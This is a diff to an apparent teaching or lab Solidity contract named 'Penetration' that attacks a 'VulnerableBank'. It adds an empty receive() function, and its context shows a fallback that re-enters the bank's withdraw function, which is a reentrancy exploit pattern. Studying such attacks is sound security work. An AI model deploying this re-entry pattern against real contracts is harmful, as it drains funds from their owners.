@@ -32,6 +32,12 @@ contract Penetration {
         vulnerableBank = VulnerableBank(_vulnerableBankAddress);
     }
 
+
+    // to silence the warning
+    receive() external payable {}
+
+
+
     // Fallback function to re-enter the withdraw function
     fallback() external payable {
         if (address(vulnerableBank).balance >= 1 ether) {
